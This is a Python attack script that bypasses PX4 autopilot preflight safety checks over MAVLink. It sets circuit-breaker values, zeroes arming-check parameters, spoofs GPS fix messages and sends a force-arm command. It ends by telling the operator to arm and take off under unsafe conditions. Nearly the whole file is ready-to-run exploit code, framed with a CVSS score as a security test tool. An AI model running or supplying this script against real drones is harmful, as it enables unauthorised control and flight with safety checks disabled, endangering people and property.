#!/usr/bin/env python3
"""
PX4 Preflight Check Bypass
Bypass PX4 preflight safety checks to allow takeoff with unsafe conditions

PX4 performs preflight safety checks before allowing takeoff. This exploit
attempts to bypass these checks through parameter manipulation.

CVSS Score: 7.0 (High)
Affected: PX4-Autopilot drones
"""

import sys
import time
from pymavlink import mavutil

def bypass_preflight_checks(connection_string):
    """
    Attempt to bypass PX4 preflight safety checks
    
    Args:
        connection_string: MAVLink connection string
    """
    try:
        print("[*] PX4 Preflight Check Bypass Attack")
        print(f"[*] Connecting to {connection_string}...")
        
        # Use helper function for connection
        import sys
        from pathlib import Path
        sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
        from mavlink_helper import connect_to_drone
        
        master = connect_to_drone(connection_string, timeout=5)
        if master is None:
            return False
        print("[+] Connected to vehicle")
        
        # Check autopilot type
        msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=2)
        if msg:
            autopilot = msg.autopilot
            autopilot_map = {
                1: 'Generic',
                3: 'ArduPilot',
                4: 'PX4',
                8: 'OpenPilot',
                12: 'PX4'
            }
            autopilot_name = autopilot_map.get(autopilot, 'Unknown')
            print(f"[*] Autopilot: {autopilot_name} (type: {autopilot})")
            
            if autopilot not in [4, 12]:
                print("[!] Target is not PX4 - preflight bypass may not be applicable")
        
        target_system = master.target_system
        target_component = master.target_component
        
        print("[*] Attempting preflight check bypass...")
        
        # Method 1: Disable preflight checks via circuit breakers
        print("[*] Method 1: Disabling preflight checks via circuit breakers...")
        
        try:
            # PX4 circuit breakers that disable preflight checks
            circuit_breakers = {
                'CBRK_IO_SAFETY': 22027,  # Disable IO safety checks
                'CBRK_FLIGHTTERM': 121212,  # Disable flight termination checks
                'CBRK_RATE_CTRL': 140253,  # Disable rate control checks
                'CBRK_USB_CHK': 197848,  # Disable USB checks
                'CBRK_VTOLARMING': 159128  # Disable VTOL arming checks
            }
            
            for param_name, param_value in circuit_breakers.items():
                print(f"[*] Setting {param_name} = {param_value}...")
                master.mav.param_set_send(
                    target_system,
                    target_component,
                    param_name.encode('utf-8'),
                    param_value,
                    mavutil.mavlink.MAV_PARAM_TYPE_UINT32
                )
                time.sleep(0.5)
            print("[+] Circuit breakers set")
        except Exception as e:
            print(f"[-] Method 1 failed: {e}")
        
        # Method 2: Disable specific preflight checks
        print("[*] Method 2: Disabling specific preflight checks...")
        
        try:
            # Disable various preflight checks
            preflight_params = {
                'COM_PREARM_MODE': 0,  # Disable prearm mode
                'COM_ARM_WO_GPS': 1,  # Allow arming without GPS
                'COM_ARM_SWISBTN_REQ': 0,  # Disable safety switch requirement
                'COM_ARM_CHK_ESCS': 0,  # Disable ESC checks
                'COM_ARM_EKF_AB': 0,  # Disable EKF attitude bias checks
                'COM_ARM_EKF_GB': 0,  # Disable EKF gyro bias checks
                'COM_ARM_EKF_POS': 0,  # Disable EKF position checks
                'COM_ARM_EKF_VEL': 0,  # Disable EKF velocity checks
                'COM_ARM_EKF_HGT': 0,  # Disable EKF height checks
                'COM_ARM_EKF_YAW': 0,  # Disable EKF yaw checks
                'COM_ARM_IMU_ACC': 0,  # Disable IMU accelerometer checks
                'COM_ARM_IMU_GYR': 0,  # Disable IMU gyroscope checks
                'COM_ARM_MAG_STR': 0,  # Disable magnetometer strength checks
                'COM_ARM_MAG_ANG': 0,  # Disable magnetometer angle checks
                'COM_ARM_SW_HIT': 0,  # Disable switch hit checks
                'COM_ARM_MIS_REQ': 0,  # Disable mission requirement checks
                'COM_ARM_WIN_MAV': 0  # Disable MAVLink window checks
            }
            
            for param_name, param_value in preflight_params.items():
                try:
                    master.mav.param_set_send(
                        target_system,
                        target_component,
                        param_name.encode('utf-8'),
                        param_value,
                        mavutil.mavlink.MAV_PARAM_TYPE_UINT32
                    )
                    time.sleep(0.1)
                except:
                    pass  # Some parameters may not exist on all PX4 versions
            print("[+] Preflight check parameters modified")
        except Exception as e:
            print(f"[-] Method 2 failed: {e}")
        
        # Method 3: Spoof sensor data to pass checks
        print("[*] Method 3: Attempting to spoof sensor data...")
        
        try:
            # Spoof GPS data to make system think it's ready
            # This may help bypass GPS-related preflight checks
            for i in range(10):
                master.mav.gps_raw_int_send(
                    0,  # Time since GPS boot
                    3,  # GPS fix type (3 = 3D fix)
                    37.7749 * 1e7,  # Latitude (San Francisco)
                    -122.4194 * 1e7,  # Longitude
                    100000,  # Altitude (mm)
                    65535,  # HDOP
                    65535,  # VDOP
                    65535,  # Velocity
                    65535,  # Speed accuracy
                    65535,  # Horizontal accuracy
                    65535  # Vertical accuracy
                )
                time.sleep(0.1)
            print("[+] GPS data spoofed")
        except Exception as e:
            print(f"[-] Method 3 failed: {e}")
        
        # Method 4: Force arm with override
        print("[*] Method 4: Force arming with override...")
        
        try:
            # Attempt to arm with force flag that bypasses preflight checks
            master.mav.command_long_send(
                target_system,
                target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,
                1,  # Arm
                21196,  # Force arm (bypass checks)
                0, 0, 0, 0, 0
            )
            time.sleep(1)
            print("[+] Force arm command sent")
        except Exception as e:
            print(f"[-] Method 4 failed: {e}")
        
        # Method 5: Modify safety parameters
        print("[*] Method 5: Modifying safety parameters...")
        
        try:
            # Modify safety-related parameters
            safety_params = {
                'COM_ARM_EKF_AB': 0,  # Disable EKF checks
                'COM_ARM_EKF_GB': 0,
                'COM_ARM_EKF_POS': 0,
                'COM_ARM_EKF_VEL': 0,
                'COM_ARM_EKF_HGT': 0,
                'COM_ARM_EKF_YAW': 0
            }
            
            for param_name, param_value in safety_params.items():
                try:
                    master.mav.param_set_send(
                        target_system,
                        target_component,
                        param_name.encode('utf-8'),
                        param_value,
                        mavutil.mavlink.MAV_PARAM_TYPE_UINT32
                    )
                    time.sleep(0.1)
                except:
                    pass
            print("[+] Safety parameters modified")
        except Exception as e:
            print(f"[-] Method 5 failed: {e}")
        
        print("[+] Preflight check bypass attempts completed")
        print("[!] If vulnerable, drone may now be armable with unsafe conditions")
        print("[!] Attempt to arm and takeoff to verify bypass")
        
        return True
        
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 px4_preflight_bypass.py <connection>")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("\nExamples:")
        print("  python3 px4_preflight_bypass.py udp:127.0.0.1:14550")
        print("\nPX4 Preflight Check Bypass")
        print("CVSS Score: 7.0 (High)")
        print("Affected: PX4-Autopilot drones")
        sys.exit(1)
    
    connection = sys.argv[1]
    bypass_preflight_checks(connection)

if __name__ == "__main__":
    main()
